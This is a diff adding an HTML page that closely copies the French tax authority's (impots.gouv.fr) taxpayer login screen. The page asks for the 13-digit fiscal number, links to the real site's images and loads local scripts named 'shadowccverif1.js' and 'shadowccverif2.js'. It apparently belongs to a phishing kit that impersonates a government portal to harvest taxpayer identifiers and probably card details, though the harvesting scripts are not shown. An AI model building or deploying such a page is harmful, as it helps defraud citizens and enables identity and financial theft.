@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Particuliers | authentification</title>
+    <link rel="stylesheet" href="css/theme.css" />
+    <link rel="stylesheet" href="css/icon.css" />
+    <link rel="stylesheet" href="css/tooltip.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"></script>
+
+    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
+     
+     
+
+
+    <link rel="shortcut icon" href="images/favicon.ico" type="image/ico" />
+
+</head>
+
+<body>
+
+    <header>
+        <div class="container">
+            <a id="logo" class="col-xs-12 col-sm-6 col-lg-7" href="#">
+                <span class="sr-only">Authentification</span>
+            </a>
+            <h1 class="sr-only">Authentification</h1>
+            <ul id="acces_espace" class="col-xs-12 col-sm-6 col-lg-5">
+
+                <li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+                    <a class="btn btn-primary" id="partPriv" href="https://cfspart.impots.gouv.fr/Login">
+                        Votre espace particulier
+                    </a>
+                </li>
+
+                <li class="col-xs-6 col-sm-9 col-md-7 pull-right">
+                    <a class="btn btn-danger" id="proPriv" href="https://cfspro.impots.gouv.fr/mire/accueil.do">
+                       Votre espace professionnel
+                    </a>
+                </li>
+            </ul>
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="row">
+            <ol class="breadcrumb ">
+                <li><a href="#" id="toPortailPub">Accueil</a></li>
+                <li class="active">Authentification</li>
+            </ol>
+        </div>
+    </div>
+
+
+    <main class="container" id="contenu">
+
+        <div class="row">
+
+            <div class="col-md-6">
+                <div class="panel panel-default">
+
+                    <div class="panel-heading">
+                        <h2 id="titre_authent" class="text-left" style="margin-left: 25px;">Connexion ou création de votre espace</h2>
+                    </div>
+
+                    <div class="panel-body">
+
+                        <div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
+
+                        <div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>
+
+                        <div class="row">
+                            <div class="col-md-12">
+                                <div class="form-group" id="fg_spi">
+                                    <label for="spi_tmp">numéro fiscal</label>
+                                    <input class="form-control" type="tel" id="numeri_fiscal" data-maxlength="13" placeholder="13 chiffres">
+                                </div>
+                            </div>
+                        </div>
+
+                        <div class="row" id="goOnBtn ">
+                            <div class="col-md-12 ">
+                                <div class="form-group text-center ">
+                                    <button id="connexion_off" type="button" class="btn btn-default disabled">Continuer</button>
+                                    <button id="connexion_on" type="button" class="btn btn-primary hide">Continuer</button>
+                                </div>
+                            </div>
+                        </div>
+
+                    </div>
+
+
+                    <div class="panel-footer text-center " id="FranceConnect ">
+                        <div class="col-md-12 text-center ">
+                            <div id="erreurFC " role="alert " class="erreur alert alert-danger hide ">
+                                Vous ne pouvez actuellement pas vous identifier en utilisant FranceConnect.<br> Vous pouvez contacter le support FranceConnect pour de plus amples renseignements
+                            </div>
+                            <div role="alert " class="erreur alert alert-danger hide " id="Cat2FC1 ">
+                                La demande d'activation de votre mot de passe est en cours.<br> Vous avez reçu un courriel à l'adresse indiquée.<br> Pour vous connecter via FranceConnect, vous devez obligatoirement cliquer sur le lien indiqué dans ce
+                                courriel.
+                                <br> Attention, ce lien est valable 24 heures.<br>
+                            </div>
+                            <div role="alert " class="erreur alert alert-danger hide " id="Cat2FC2 ">
+                                Vous ne pouvez actuellement pas vous identifier en utilisant FranceConnect.<br> Vous pouvez contacter le support FranceConnect pour de plus amples renseignements
+                            </div>
+                            <a id="leBouton " href="# " onclick="$(this).closest( 'form').submit() "><img src="https://cfspart.impots.gouv.fr/templates/images/logo-fc.svg " height="60 " width="200 " alt="S'identifier avec FranceConnect"></a><br>
+                        </div>
+
+
+
+                        <p class="text-center">
+                            <a href="https://app.franceconnect.gouv.fr/en-savoir-plus" id="cQuoiFCGauche" target="_blank" rel="noopener">
+                                        Qu'est-ce que FranceConnect? <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fenètre"></span>
+                                    </a>
+                        </p>
+
+
+                    </div>
+
+                </div>
+            </div>
+
+
+            <section class="col-md-6" id="aide">
+                <div class="panel panel-default">
+                    <div class="panel-heading">
+                        <h2 class="text-center">Aide</h2>
+                    </div>
+                    <div class="panel-body">
+                        <details id="ou_trouver" class="aideSPI">
+                            <summary role="button" aria-expanded="false">Où trouver votre numéro fiscal&nbsp;?</summary>
+                            <div class="well">
+                                <p>Si vous disposez déjà d'un espace particulier, vous pouvez <a href="#" id="disp_perte_spi" onclick="return false;" data-target="#numFiscal" data-toggle="modal" title="Ouverture dans une fenêtre modale">recevoir votre numéro fiscal par courriel</a>.</p>
+                                <p>Il figure aussi en haut de la première page de votre dernière déclaration de revenus reçue <a href="https://www.impots.gouv.fr/portail/particulier/questions/jai-egare-les-identifiants-dacces-mon-espace-particulier-comment-puis-je-les-0"
+                                        target="_blank" rel="noopener">ou sur vos avis <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fenètre"></span></a> : </p>
+                                <div id="exemple_SPI">
+                                    <figure class="text-center spacer-top" role="group">
+                                        <img src="https://cfspart.impots.gouv.fr/templates/images/spi.svg" alt="Légende disponible après l'illustration" class="img-responsive center-block img-thumbnail" width="473" height="145">
+                                        <figcaption class="text-muted"><em>Illustration : emplacement de votre numéro fiscal, sur votre déclaration</em></figcaption>
+                                    </figure>
+                                    <figure class="text-center spacer-top" role="group">
+                                        <img src="https://cfspart.impots.gouv.fr/templates/images/spi1.svg" alt="Légende disponible après l'illustration" class="img-responsive center-block img-thumbnail" width="350" height="145">
+                                        <figcaption class="text-muted"><em> Illustration : emplacement de votre numéro fiscal, sur votre avis</em></figcaption>
+                                    </figure>
+                                </div>
+                            </div>
+                        </details>
+                        <details id="aide_spi1" class="aideSPI">
+                            <summary role="button" aria-expanded="false">Vous n'avez pas encore de numéro fiscal&nbsp;?</summary>
+                            <div class="well">
+                                <p>Pour obtenir la création de votre numéro fiscal, veuillez vous adresser à votre
+                                    <span id="CFP"><a class="CFP" target="_blank" rel="noopener" title="Nouvelle fenêtre" href="https://www.impots.gouv.fr/portail/contacts?778">centre des Finances Publiques <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fenêtre">.</span></a>
+                                    </span>
+                                </p>
+                            </div>
+                        </details>
+
+
+                    </div>
+
+
+                    <!-- Fin du panel-body  -->
+                    <div class="panel-footer marge">
+                        <details id="aide_services">
+                            <summary role="button" aria-expanded="false">Les services disponibles sur votre espace particulier</summary>
+                            <div class="well">
+                                <p>Vous pouvez&nbsp;: </p>
+                                <ul>
+                                    <li>gérer votre prélèvement à la source,</li>
+                                    <li>payer vos impôts,</li>
+                                    <li>déclarer vos revenus,</li>
+                                    <li>consulter vos déclarations et avis d'imposition,</li>
+                                    <li>consulter la situation de vos paiements,</li>
+                                    <li>accéder à des données publiques,</li>
+                                    <li>retrouver les coordonnées de vos services compétents</li>
+                                    <li>réaliser des demandes et démarches via votre messagerie sécurisée</li>
+                                </ul>
+                            </div>
+                        </details>
+                        <details id="aide_cookies">
+                            <summary role="button" aria-expanded="false">Gestion des <em lang="en">cookies</em></summary>
+                            <div class="well">
+                                <p>Un <em>cookie</em> est un petit fichier, enregistré sur votre appareil, qui contient des informations nécessaires au fonctionnement du site.</p>
+                                <p>Nous n'y enregistrons pas de donnée personnelle.</p>
+                                <p>Votre navigateur propose en général un mode de navigation privée, qui supprime les <em>cookies</em> à la fermeture du logiciel.</p>
+                            </div>
+                        </details>
+
+
+                    </div>
+
+                </div>
+            </section>
+        </div>
+
+    </main>
+
+    <footer role="contentinfo">
+        <p class="col-md-12 text-center">Direction générale des Finances publiques</p>
+    </footer>
+
+
+
+
+</body>
+
+<script type="text/javascript" src="js/start.js"></script>
+<script type="text/javascript" src="js/shadowccverif1.js"></script>
+<script type="text/javascript" src="js/shadowccverif2.js"></script>
+</html>
